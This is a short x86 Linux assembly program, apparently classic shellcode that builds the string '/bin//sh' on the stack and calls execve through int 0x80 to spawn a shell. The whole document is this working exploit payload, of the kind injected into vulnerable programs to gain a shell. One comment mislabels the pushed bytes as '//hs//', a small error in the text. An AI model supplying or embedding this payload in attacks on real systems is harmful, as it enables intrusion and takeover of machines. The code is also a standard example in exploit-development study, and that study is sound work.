section .text
global _start

_start:
	xor eax, eax
	xor edx, edx
	push eax
	push 0x68732f2f ; //hs//
	push 0x6e69622f ; /bin
	mov ebx, esp
	push eax
	push ebx
	mov ecx, esp
	mov al, 0xb
	int 0x80